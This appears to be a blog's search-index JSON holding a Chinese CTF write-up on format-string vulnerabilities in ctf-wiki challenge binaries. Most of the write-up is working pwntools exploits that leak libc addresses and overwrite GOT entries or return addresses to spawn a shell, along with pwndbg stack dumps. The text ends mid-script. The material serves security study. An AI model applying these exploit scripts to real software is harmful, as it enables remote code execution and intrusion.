{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Eureka","url":"https://dawoxiansigema.github.io","root":"/"},"pages":[{"title":"categories","date":"2020-04-22T06:47:40.000Z","updated":"2023-10-31T12:59:20.571Z","comments":true,"path":"categories/index.html","permalink":"https://dawoxiansigema.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-04-24T07:40:24.000Z","updated":"2023-10-31T12:47:24.810Z","comments":true,"path":"tags/index.html","permalink":"https://dawoxiansigema.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Fomatstring","slug":"Fomatstring","date":"2023-10-31T13:36:34.000Z","updated":"2023-10-31T13:42:54.467Z","comments":true,"path":"2023/10/31/Fomatstring/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/Fomatstring/","excerpt":"ctfwiki格式化字符串部分题解","text":"ctfwiki格式化字符串部分题解 goodluck特殊情况这道题比较特殊 一般的题目是不会把flag加载进堆栈中的 在printf结束时断下时 1234567891011pwndbg&gt; stack 5000:0000│ rsp 0x7fffffffe568 —▸ 0x400890 (main+234) ◂— mov edi, 0x4009b801:0008│ 0x7fffffffe570 ◂— 0x6100000102:0010│ 0x7fffffffe578 —▸ 0x602ca0 ◂— 0x61616161 /* &#x27;aaaa&#x27; */03:0018│ 0x7fffffffe580 —▸ 0x6022a0 ◂— 0x004:0020│ 0x7fffffffe588 —▸ 0x7fffffffe590 ◂— 0x7365747b47414c46 (&#x27;FLAG&#123;tes&#x27;)05:0028│ 0x7fffffffe590 ◂— 0x7365747b47414c46 (&#x27;FLAG&#123;tes&#x27;)06:0030│ 0x7fffffffe598 ◂— 0xffff0a7d3332317407:0038│ 0x7fffffffe5a0 ◂— 0xffffffffffff08:0040│ 0x7fffffffe5a8 ◂— 0x9252308373e5500009:0048│ rbp 0x7fffffffe5b0 ◂— 0x0 那么对于此题而言确实是比较刚好 只需要判断0x7fffffffe588是printf的第几个参数即可 由于是64位的缘故 还有6个寄存器 6+4-1&#x3D;9 只需要输入%9$s即可 也可以用fmtarg 12pwndbg&gt; fmtarg 0x7fffffffe588The index of format argument : 10 (&quot;\\\\%9$p&quot;) 关于这种情况的就记录到此 毕竟在比赛中极少见 最后print一下即可 12345from pwn import *sh = process(&#x27;./goodluck&#x27;)payload = &#x27;%9$s&#x27;sh.sendline(payload)print sh.recv() 一般情况对于一般情况 我们先分别拿32位和64位举个例子 1234567#include &lt;stdio.h&gt;int main()&#123; char a[100]; scanf(&quot;%s&quot;,a); printf(a); return 0;&#125; 注意一点 无论是32位还是64位而言 payload的输入都得通过exp执行 手工输入会造成输入字符串不分组 无法提取所需数据 对于32位程序而言 情况和ctfwiki上面的差不多 12345678910111213from pwn import *sh = process(&#x27;./32&#x27;)elf = ELF(&#x27;./32&#x27;)#context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]gdb.attach(sh)__isoc99_scanf_got = elf.got[&#x27;__isoc99_scanf&#x27;]print (hex(__isoc99_scanf_got))payload = p32(__isoc99_scanf_got) + &#x27;@@%7$s@@&#x27;print (payload) sh.sendline(payload)sh.recvuntil(&#x27;@@&#x27;)print hex(u32(sh.recv(4))) 由于手工输入payload无法观察真实情况栈结构 我们使用gdb.attach()函数 请注意 如果有读者和我一样使用的是pwndocker 那么得装个tmux docker内启动tmux 并设置context.terminal如上 在运行后需在gdb内设置printf函数断点 1234567891011121314pwndbg&gt; stack 25│00:0000│ esp 0xff9bc7bc —▸ 0x80484c5 (main+63) ◂— add esp, 0x10│01:0004│ 0xff9bc7c0 —▸ 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │02:0008│ 0xff9bc7c4 —▸ 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │03:000c│ 0xff9bc7c8 —▸ 0xf7fc7990 ◂— 0x0│04:0010│ 0xff9bc7cc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b63│05:0014│ 0xff9bc7d0 ◂— 0x0│06:0018│ 0xff9bc7d4 ◂— 0xc30000│07:001c│ 0xff9bc7d8 ◂— 0x1│08:0020│ eax 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │09:0024│ 0xff9bc7e0 ◂— &#x27;@@%7$s@@&#x27;│0a:0028│ 0xff9bc7e4 ◂— &#x27;$s@@&#x27;│0b:002c│ 0xff9bc7e8 —▸ 0xf7fc7000 ◂— 0x2bf24│0c:0030│ 0xff9bc7ec ◂— 0x0 可以看到从0xff9bc7dc开始 将payload分割为几个4字节进行存储 这样结合%7$s就很好明白了 对于@@@@的话 相当于打个标签吧 不过记得加上recvuntil() 1234567DEBUG] Sent 0xd bytes: 00000000 14 a0 04 08 40 40 25 37 24 73 40 40 0a │····│@@%7│$s@@│·│ 0000000d[*] Process &#x27;./32&#x27; stopped with exit code 0 (pid 39281)[DEBUG] Received 0xc bytes: 00000000 14 a0 04 08 40 40 a0 03 d9 f7 40 40 │····│@@··│··@@│ 0000000c 还有一个要注意的点就是 对于我们想要获取的got表 地址不能以00结尾 可以用这句查看 1print hex(libc.symbols[&#x27;scanf&#x27;]) 对于32位而言 情况十分常规 但是此法在64位系统中略有不同 因为在64位系统中 虚拟内存的高16位永远是赋值为0 拿got表举例 12345678910pwndbg&gt; got/ctf/work/64: file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 0000000000600ff0 R_X86_64_GLOB_DAT __libc_start_main@GLIBC_2.2.50000000000600ff8 R_X86_64_GLOB_DAT __gmon_start__0000000000601018 R_X86_64_JUMP_SLOT printf@GLIBC_2.2.50000000000601020 R_X86_64_JUMP_SLOT __isoc99_scanf@GLIBC_2.7 可以看到开头全是0 那么如果还是以got表地址打头 会直接导致后面的%n$s被截断 那么我们得把它反过来写 并且我们选择时也不能选择结尾为0的got表 不然一样会造成截断 1payload = &#x27;@@%7$s@@&#x27;.ljust(0x20,&#x27;a&#x27;) + p64(printf_got) 请注意 当你把got表地址放后面时 会导致所在参数位置的改变 此时我们需要重新设置一遍 不过既然涉及到这个问题 我们在输入时就必须注意padding的问题 我们必须让got表地址处于一个单独的栈单元内 这就需要我们对齐 32位不需要对齐是因为4字节比较少出现没对齐的情况 12345678pwndbg&gt; stack 25│00:0000│ rsp 0x7ffd8ffca558 —▸ 0x400588 (main+49) ◂— mov eax, 0│01:0008│ rdi 0x7ffd8ffca560 ◂— 0x4073243031254040 (&#x27;@@%10$s@&#x27;)│02:0010│ 0x7ffd8ffca568 ◂— 0x6161616161616140 (&#x27;@aaaaaaa&#x27;)│03:0018│ 0x7ffd8ffca570 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)│04:0020│ 0x7ffd8ffca578 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)│05:0028│ 0x7ffd8ffca580 —▸ 0x601018 (printf@got.plt) —▸ 0x7f8192b24cc0 (printf) ◂— endbr64 │06:0030│ 0x7ffd8ffca588 —▸ 0x7ffd8ffca500 ◂— 0x0 可以看到 如上是实现栈对齐后的效果 fmtarg即可确定参数位置 1fmtarg 0x7ffd8ffca580 最后就是输出 我们输入时可以看到我们的地址是6字节 然而我们输入的padding是会跟着输出的 格式也是打包好的 并且还有一堆乱七八糟的东西 1�&lt;\\\\xff��~@@aaaaaaaaaaaaaaaaaaaaaaa\\\\x18` 我们要前6字节 但是u64解包需要8字节 故exp如下 1234567891011121314from pwn import *sh = process(&#x27;./64&#x27;)elf = ELF(&#x27;./64&#x27;)context.log_level = &#x27;debug&#x27;libc = elf.libccontext.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]gdb.attach(sh)printf_got = elf.got[&#x27;printf&#x27;] print (hex(printf_got))payload = &#x27;@@%10$s@@&#x27;.ljust(0x20,&#x27;a&#x27;) + p64(printf_got)print (payload) sh.sendline(payload)sh.recvuntil(&#x27;@@&#x27;)print hex(u64(sh.recv(6).ljust(8,&quot;\\\\x00&quot;))) 我们最后回到goodluck那题 可惜就算这样他也还是不给我机会 只有关于flag的栈 耻辱下播 pwn这题对于初学的我还是有点难度的 值得学习 此情况只有在部分reload时才可使用 准备工作1234567891011121314151617181920212223242526272829303132int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; signed int v3; // eax char s1; // [esp+14h] [ebp-2Ch] int v5; // [esp+3Ch] [ebp-4h] setbuf(stdout, 0); ask_username(&amp;s1); ask_password(&amp;s1); while ( 1 ) &#123; while ( 1 ) &#123; print_prompt(); v3 = get_command(); v5 = v3; if ( v3 != 2 ) break; put_file(); &#125; if ( v3 == 3 ) &#123; show_dir(); &#125; else &#123; if ( v3 != 1 ) exit(1); get_file(); &#125; &#125;&#125; main函数大致了解过程 输入username和password 然后选择一项服务 此题有三个重要的子函数 分别是put_file get_file show_dir 在此之前先说一下password函数 123456789int __cdecl ask_password(char *s1)&#123; if ( strcmp(s1, &quot;sysbdmin&quot;) ) &#123; puts(&quot;who you are?&quot;); exit(1); &#125; return puts(&quot;welcome!&quot;);&#125; 这个strcmp有点东西 如果比较发现相等 返回值为0 而这个s1是username传来的 123456789101112131415_DWORD *put_file()&#123; _DWORD *v0; // ST1C_4 _DWORD *result; // eax v0 = malloc(0xF4u); printf(&quot;please enter the name of the file you want to upload:&quot;); get_input((int)v0, 40, 1); printf(&quot;then, enter the content:&quot;); get_input((int)(v0 + 10), 200, 1); v0[60] = file_head; result = v0; file_head = (int)v0; return result;&#125; 对于put_file而言 此函数首先申请一段内存空间 v0是指向开头的指针 两个get_input分别对v0所在空间输入40 200个字节数据 并且在v0的最后位置存储一个file_head值 在最初该值为0是因为file_head处于bss段 不过在每次调用put_file的最后 file_head都会被赋值为v0指针 因此在多次调用put_file时 会形成一个链栈结构 1234567891011121314151617181920int get_file()&#123; char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(&quot;enter the file name you want to get:&quot;); __isoc99_scanf(&quot;%40s&quot;, &amp;s1); if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) ) puts(&quot;too young, too simple&quot;); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) &#123; if ( !strcmp(i, &amp;s1) ) &#123; strcpy(&amp;dest, i + 40); return printf(&amp;dest); &#125; &#125; return printf(&amp;dest);&#125; get_file则是格式化字符串漏洞的触发函数 不过逻辑很简单就是了 把输入名字所在的那个链栈内容复制一下 然后printf 这倒是简单 123456789101112131415161718192021int show_dir()&#123; int v0; // eax char s[1024]; // [esp+14h] [ebp-414h] int i; // [esp+414h] [ebp-14h] int j; // [esp+418h] [ebp-10h] int v5; // [esp+41Ch] [ebp-Ch] v5 = 0; j = 0; bzero(s, 0x400u); for ( i = file_head; i; i = *(_DWORD *)(i + 240) ) &#123; for ( j = 0; *(_BYTE *)(i + j); ++j ) &#123; v0 = v5++; s[v0] = *(_BYTE *)(i + j); &#125; &#125; return puts(s);&#125; show_dir这个函数比较有意思 表面上看它也还是和get_file一样输出链栈内容 不过当我进行测试之后发现不太一样 123456789101112131415161718pwndbg&gt; rStarting program: /ctf/work/pwn3 Connected to ftp.hacker.server220 Serv-U FTP Server v6.4 for WinSock ready...Name (ftp.hacker.server:Rainism):rxraclhmwelcome!ftp&gt;putplease enter the name of the file you want to upload:123then, enter the content:abcftp&gt;put please enter the name of the file you want to upload:321 then, enter the content:bcaftp&gt;dir321123ftp&gt;getenter the file name you want to get:123abcftp&gt;dir321123 get_file是输入put_file所输入的文件名 输出对应文件内容 而show_dir就只输出文件名(直到写wp时才明白这个show_dir名字是这个意思 HIJACK GOT没有明显的flag痕迹 也没有明显的条件判断来执行shell等 那么尝试一波劫持got 将某个函数地址改为system的 1get_file() put_file() show_dir() 能用到的也就这三个函数 put_file目前发现格式化字符串漏洞 但是get与dir都没有明显漏洞 在get_file中利用漏洞进行got表劫持是可以做到的 但是got表劫持所修改的函数必须要在后面被调用 而且system的话 还需要&#x2F;bin&#x2F;sh;参数 才能形成system(’&#x2F;bin&#x2F;sh;’)的shell 123456789101112131415161718192021int show_dir()&#123; int v0; // eax char s[1024]; // [esp+14h] [ebp-414h] int i; // [esp+414h] [ebp-14h] int j; // [esp+418h] [ebp-10h] int v5; // [esp+41Ch] [ebp-Ch] v5 = 0; j = 0; bzero(s, 0x400u); for ( i = file_head; i; i = *(_DWORD *)(i + 240) ) &#123; for ( j = 0; *(_BYTE *)(i + j); ++j ) &#123; v0 = v5++; s[v0] = *(_BYTE *)(i + j); &#125; &#125; return puts(s);&#125; 回到show_dir函数中 我们已经知道他只输出文件名 那么说明s我们是可控的 只需要put时输入即可 那么我们如果将puts的地址劫持 修改为system地址 即可实现getshell EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *from LibcSearcher import LibcSearchersh = process(&quot;./pwn3&quot;)elf = ELF(&#x27;./pwn3&#x27;)context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]tmp = &#x27;sysbdmin&#x27;name = &quot;&quot;for i in tmp: name += chr(ord(i)-1)def password(): sh.recvuntil(&#x27;Name (ftp.hacker.server:Rainism):&#x27;) sh.sendline(name)def put(name,payload): sh.sendline(&#x27;put&#x27;) sh.recvuntil(&#x27;please enter the name of the file you want to upload:&#x27;) sh.sendline(name) sh.recvuntil(&#x27;then, enter the content:&#x27;) sh.sendline(payload)def get(name): sh.sendline(&#x27;get&#x27;) sh.recvuntil(&quot;enter the file name you want to get:&quot;) sh.sendline(name) data = sh.recv() return data#gdb.attach(sh)password()puts_got = elf.got[&#x27;puts&#x27;]payload = &#x27;%8$s&#x27; + p32(puts_got)put(&#x27;1111&#x27;,payload)#puts_addr = u32(get(&#x27;1111&#x27;)[:4])puts_addr = u32(get(&#x27;1111&#x27;)[:4])#print hex(puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)system_offset = libc.dump(&#x27;system&#x27;)puts_offset = libc.dump(&#x27;puts&#x27;)system_addr = puts_addr - puts_offset + system_offsetlog.success(&#x27;system addr:&#x27; + hex(system_addr))payload = fmtstr_payload(7,&#123;puts_got:system_addr&#125;)put(&#x27;/bin/sh;&#x27;,payload)sh.recvuntil(&#x27;ftp&gt;&#x27;)get(&#x27;/bin/sh;&#x27;)sh.sendline(&#x27;dir&#x27;)sh.interactive() 不过 在编写EXP时 遇到了许多坑 首先是栈中参数位置的确定 12345678910│00:0000│ esp 0xffa77aa0 —▸ 0xffa77abc ◂— 0x73243825 (&#x27;%8$s&#x27;)│01:0004│ 0xffa77aa4 —▸ 0x90521d8 ◂— 0x73243825 (&#x27;%8$s&#x27;)│02:0008│ 0xffa77aa8 ◂— 0x4│03:000c│ 0xffa77aac —▸ 0xf7dc226c ◂— 0x3787│04:0010│ 0xffa77ab0 —▸ 0xf7fa0a74 ◂— 0x0│05:0014│ 0xffa77ab4 ◂— 0x7d4│06:0018│ 0xffa77ab8 —▸ 0xf7fa02a0 (_IO_helper_jumps) ◂— 0x0│07:001c│ eax edx 0xffa77abc ◂— 0x73243825 (&#x27;%8$s&#x27;)│08:0020│ 0xffa77ac0 —▸ 0x804a028 (puts@got.plt) —▸ 0xf7e24c30 (puts) ◂— endbr32 │09:0024│ 0xffa77ac4 —▸ 0x8048c00 ◂— push ebx /* &#x27;Serv-U FTP Server v6.4 for WinSock ready...&#x27; */ 这是put完之后 运行到get时printf处的断点 可以看到此处的堆栈略有不同 我们首先使用fmtarg 12pwndbg&gt; fmtarg 0xffa77ac0The index of format argument : 8 (&quot;\\\\%7$p&quot;) 正常来说 我们设置的参数位置应该是%7$p 但是若真用7 那么定位到的内容是%7$s它本身 修改部分代码如下 1234567891011121314151617181920212223242526272829303132333435363738def get(name): sh.sendline(&#x27;get&#x27;) sh.recvuntil(&quot;enter the file name you want to get:&quot;) sh.sendline(name) data = sh.recv() return datapassword()puts_got = elf.got[&#x27;puts&#x27;]payload = &#x27;%7$p&#x27; + p32(puts_got)print payloadput(&#x27;1111&#x27;,payload)gdb.attach(sh)print get(&#x27;1111&#x27;)│00:0000│ esp 0xffa94b60 —▸ 0xffa94b7c ◂— 0x70243725 (&#x27;%7$p&#x27;)│01:0004│ 0xffa94b64 —▸ 0x82791d8 ◂— 0x70243725 (&#x27;%7$p&#x27;)│02:0008│ 0xffa94b68 ◂— 0x4│03:000c│ 0xffa94b6c —▸ 0xf7d4f26c ◂— 0x3787│04:0010│ 0xffa94b70 —▸ 0xf7f2da74 ◂— 0x0│05:0014│ 0xffa94b74 ◂— 0x7d4│06:0018│ 0xffa94b78 —▸ 0xf7f2d2a0 (_IO_helper_jumps) ◂— 0x0│07:001c│ eax edx 0xffa94b7c ◂— 0x70243725 (&#x27;%7$p&#x27;)│08:0020│ 0xffa94b80 —▸ 0x804a028 (puts@got.plt) —▸ 0xf7db1c30 (puts) ◂— endbr32root@5c3176a78240:/ctf/work# python2 exp.py[+] Starting local process &#x27;./pwn3&#x27;: pid 59656[*] &#x27;/ctf/work/pwn3&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)%7$p(\\\\xa0\\\\x04[*] running in new terminal: /usr/bin/gdb -q &quot;./pwn3&quot; 59656[+] Waiting for debugger: Done0x70243725(\\\\xa0\\\\x04ftp&gt;[*] Stopped process &#x27;./pwn3&#x27; (pid 59656) 可以看到 确实是0x70243725 不过为啥会这样我也不是很确定 1234567891011121314pwndbg&gt; stack 25│00:0000│ esp 0xff9bc7bc —▸ 0x80484c5 (main+63) ◂— add esp, 0x10│01:0004│ 0xff9bc7c0 —▸ 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │02:0008│ 0xff9bc7c4 —▸ 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │03:000c│ 0xff9bc7c8 —▸ 0xf7fc7990 ◂— 0x0│04:0010│ 0xff9bc7cc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b63│05:0014│ 0xff9bc7d0 ◂— 0x0│06:0018│ 0xff9bc7d4 ◂— 0xc30000│07:001c│ 0xff9bc7d8 ◂— 0x1│08:0020│ eax 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │09:0024│ 0xff9bc7e0 ◂— &#x27;@@%7$s@@&#x27;│0a:0028│ 0xff9bc7e4 ◂— &#x27;$s@@&#x27;│0b:002c│ 0xff9bc7e8 —▸ 0xf7fc7000 ◂— 0x2bf24│0c:0030│ 0xff9bc7ec ◂— 0x0 这是之前那个32位例子的栈结构 比较一下可以看到 此题的栈结构中缺少第一个main的返回地址 因为fmtarg是使用该地址与esp地址的差值进行计算的 所以参数可+1 不过我不是很确定 属于卡住的时候可以验证一下 1payload = fmtstr_payload(7,&#123;puts_got:system_addr&#125;) 然后是这句payload的目的是将puts的got表地址 修改为system的函数地址 不过该部分的参数不知道为什么又变成7了 应该是要与fmtarg函数返回的一样 HIJACK RETADDR这题还可以用函数调用栈的方式来做 12345678910111213.text:080487F6 get_file proc near ; CODE XREF: main+57↑p.text:080487F6.text:080487F6 dest = byte ptr -0FCh.text:080487F6 s1 = byte ptr -34h.text:080487F6 var_C = dword ptr -0Ch.text:080487F6.text:080487F6 ; __unwind &#123;.text:080487F6 push ebp.text:080487F7 mov ebp, esp.text:080487F9 sub esp, 118h.text:080487FF mov dword ptr [esp], offset aEnterTheFileNa ; &quot;enter the file name you want to get:&quot;.text:08048806 call _printf.text:0804880B lea eax, [ebp+s1] 这是get_file的汇编代码 可以看到他先是入栈ebp 然后移动esp并空出118h的栈空间 这是函数调用时的操作 那么对于目前的格式化字符串漏洞而言 ebp所在地址距离esp有118h 也就是280 那么280&#x2F;4 &#x3D; 70 那么我们取第70个参数就能获取到get_file函数的ebp地址 123│46:0118│ ebp 0xff817f38 —▸ 0xff817f88 ◂— 0x0pwndbg&gt; fmtarg 0xff817f38|The index of format argument : 70 (&quot;\\\\%69$p&quot;) 结合之前对于参数的判断 确实第70个(实在不行再改成69) 复习一下 ebp是在call之后入栈的 而retaddr则是在call时就入栈的 二者不一样 我们此时获取的ebp是main函数(caller)的ebp 具体去结合函数调用栈的知识 12345Breakpoint 3, 0x08048670 in main ()pwndbg&gt; stack 2500:0000│ ebp esp 0xffffd6e8 ◂— 0x001:0004│ 0xffffd6ec —▸ 0xf7decee5 (__libc_start_main+245) ◂— add esp, 0x1002:0008│ 0xffffd6f0 ◂— 0x1 这是我在main函数处下的断点 请记住此时的ebp 至于为啥会出现esp和ebp在一起的情况 主要还是具体情况具体分析 12345643:010c│ 0xffffd68c ◂— 0x044:0110│ 0xffffd690 —▸ 0xf7fbdd20 (_IO_2_1_stdout_) ◂— 0xfbad288745:0114│ 0xffffd694 —▸ 0xf7ffd990 ◂— 0x046:0118│ ebp 0xffffd698 —▸ 0xffffd6e8 ◂— 0x047:011c│ 0xffffd69c —▸ 0x80486c9 (main+92) ◂— jmp 0x80486e548:0120│ 0xffffd6a0 —▸ 0xffffd6b4 ◂— &#x27;sysbdmin&#x27; 这是我在get_file处下断点获取的ebp值 可以看到此处的ebp有个箭头 箭头后的值正是main(caller)的ebp 这说明此时ebp指针的位置是0xffffd698 栈开始的地方是这个地址 该地址存储的是旧的(caller)的ebp值 多个调用的话情况类推 123│46:0118│ ebp 0xffa13918 —▸ 0xffa13968 ◂— 0x0│47:011c│ 0xffa1391c —▸ 0x80486c9 (main+92) ◂— jmp 0x80486e5│48:0120│ 0xffa13920 —▸ 0xffa13934 ◂— &#x27;sysbdmin&#x27; 不过需要注意的是 我们获取的ebp的值是main函数的ebp值 他的值与当前的retaddr永远存在0x4c的差值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *from LibcSearcher import LibcSearchersh = process(&quot;./pwn3&quot;)elf = ELF(&#x27;./pwn3&#x27;)#context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]tmp = &#x27;sysbdmin&#x27;name = &quot;&quot;for i in tmp: name += chr(ord(i)-1)def password(): sh.recvuntil(&#x27;Name (ftp.hacker.server:Rainism):&#x27;) sh.sendline(name)def put(name,payload): sh.sendline(&#x27;put&#x27;) sh.recvuntil(&#x27;please enter the name of the file you want to upload:&#x27;) sh.sendline(name) sh.recvuntil(&#x27;then, enter the content:&#x27;) sh.sendline(payload)def get(name): sh.sendline(&#x27;get&#x27;) sh.recvuntil(&quot;enter the file name you want to get:&quot;) sh.sendline(name) data = sh.recv() return data#gdb.attach(sh)password()printf_got = elf.got[&#x27;printf&#x27;]payload = &#x27;%8$s&#x27; + p32(printf_got)put(&#x27;1111&#x27;,payload)#puts_addr = u32(get(&#x27;1111&#x27;)[:4])printf_addr = u32(get(&#x27;1111&#x27;)[:4])#print hex(puts_addr)libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)printf_offset = libc.dump(&#x27;printf&#x27;)system_offset = libc.dump(&#x27;system&#x27;)bin_sh_offset = libc.dump(&#x27;str_bin_sh&#x27;)system_addr = printf_addr - printf_offset + system_offsetbin_sh_addr = printf_addr - printf_offset + bin_sh_offsetput(&#x27;getEbp&#x27;,b&#x27;%70$p a&#x27;)tmp = get(&#x27;getEbp&#x27;)ebp = int(tmp.split()[0],16)ret_addr = ebp -0x4cpayload = fmtstr_payload(7, &#123;ret_addr + 8: bin_sh_addr&#125;)put(&#x27;setSH&#x27;, payload)get(&#x27;setSH&#x27;)payload = fmtstr_payload(7, &#123;ret_addr: system_addr&#125;)put(&#x27;setSy&#x27;, payload)get(&#x27;setSy&#x27;)sh.interactive() HIJACK RETADDR 2.0在解题的过程中也发现 其实也可以利用esp进行getshell 在比较特殊的情况中 劫持ebp可能会出现程序崩溃的情况 这个时候也可以劫持esp 因为在调用完了以后eip会走到esp的上面(高4字节 1234.text:0804866D push ebp.text:0804866E mov ebp, esp.text:08048670 and esp, 0FFFFFFF0h.text:08048673 sub esp, 40h 这是main开始对esp的操作 我们也可以在python中实现 大体不变 exp如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *from LibcSearcher import LibcSearchersh = process(&quot;./pwn3&quot;)elf = ELF(&#x27;./pwn3&#x27;)#context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]tmp = &#x27;sysbdmin&#x27;name = &quot;&quot;for i in tmp: name += chr(ord(i)-1)def password(): sh.recvuntil(&#x27;Name (ftp.hacker.server:Rainism):&#x27;) sh.sendline(name)def put(name,payload): sh.sendline(&#x27;put&#x27;) sh.recvuntil(&#x27;please enter the name of the file you want to upload:&#x27;) sh.sendline(name) sh.recvuntil(&#x27;then, enter the content:&#x27;) sh.sendline(payload)def get(name): sh.sendline(&#x27;get&#x27;) sh.recvuntil(&quot;enter the file name you want to get:&quot;) sh.sendline(name) data = sh.recv() return data#gdb.attach(sh)password()printf_got = elf.got[&#x27;printf&#x27;]payload = &#x27;%8$s&#x27; + p32(printf_got)put(&#x27;1111&#x27;,payload)#puts_addr = u32(get(&#x27;1111&#x27;)[:4])printf_addr = u32(get(&#x27;1111&#x27;)[:4])#print hex(puts_addr)libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)printf_offset = libc.dump(&#x27;printf&#x27;)system_offset = libc.dump(&#x27;system&#x27;)bin_sh_offset = libc.dump(&#x27;str_bin_sh&#x27;)system_addr = printf_addr - printf_offset + system_offsetbin_sh_addr = printf_addr - printf_offset + bin_sh_offsetput(&#x27;getEbp&#x27;,b&#x27;%70$p a&#x27;)tmp = get(&#x27;getEbp&#x27;)ebp = int(tmp.split()[0],16)esp = (ebp &amp; 0x0FFFFFFF0) - 0x40ret_addr = ebp -0x4cpayload = fmtstr_payload(7, &#123;esp + 4: bin_sh_addr&#125;)put(&#x27;setSH&#x27;, payload)get(&#x27;setSH&#x27;)payload = fmtstr_payload(7, &#123;esp - 4: system_addr&#125;)put(&#x27;setSy&#x27;, payload)get(&#x27;setSy&#x27;)sh.interactive() 当然这种情况就要具体问题具体分析了 pwnme_k0其实会了上面的那题的hijack retaddr的话 这题就很简单了 只不过他是64位的 fmtstr_payload就不能用了 得覆盖大数字 123│01:0008│ rbp 0x7fffe630b620 —▸ 0x7fffe630b660 —▸ 0x7fffe630b710 ◂— 0x0│02:0010│ 0x7fffe630b628 —▸ 0x400d74 ◂— add rsp, 0x30│03:0018│ rdi 0x7fffe630b630 ◂— &#x27;aaaaaaaa\\\\n&#x27; 0x7fffe630b660 - 0x7fffe630b628 &#x3D; 0x38 接下来需要获取返回地址 1234567.text:00000000004008A6 sub_4008A6 proc near.text:00000000004008A6 ; __unwind &#123;.text:00000000004008A6 push rbp.text:00000000004008A7 mov rbp, rsp.text:00000000004008AA mov edi, offset command ; &quot;/bin/sh&quot;.text:00000000004008AF call system.text:00000000004008B4 pop rdi 所以还需要覆盖后三位即可 或者全覆盖也行 120x4008A6 ---&gt; &#x27;4196518d%11$hn&#x27;0x8A6 ---&gt; &#x27;2214d%11$hn&#x27; 默认情况都是从尾端开始覆盖的 123A%11$hhn ---&gt; 0x88888801A%11$hn ---&gt; 0x88880001A%11$n ---&gt; 0x00000001 题目分析就略过了 逻辑比较简单 exp如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *sh = process(&#x27;./pwnme_k0&#x27;)context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]def reg(name,passwd): sh.recvuntil(&#x27;Input your username(max lenth:20):&#x27;) sh.sendline(name) sh.recvuntil(&#x27;Input your password(max lenth:20):&#x27;) sh.sendline(passwd)def show(): sh.sendline(&#x27;1&#x27;)def update(name,payload): sh.sendline(&#x27;2&#x27;) sh.recvuntil(&#x27;please input new username(max lenth:20):&#x27;) sh.sendline(name) sh.recvuntil(&#x27;please input new password(max lenth:20):&#x27;) sh.sendline(payload)#gdb.attach(sh)name = &#x27;aaaaaaaa&#x27;passwd = &#x27;%6$p&#x27;reg(name,passwd)sh.recvuntil(&#x27;&gt;&#x27;)show()#ebp = int(sh.recv()[11:25],16)#print ebpsh.recvuntil(&quot;0x&quot;)ret_addr = int(sh.recvline().strip(),16) - 0x38#ret_addr = ebp - 0x38print hex(ret_addr)payload = &#x27;4196518d%11$hn&#x27;payload += 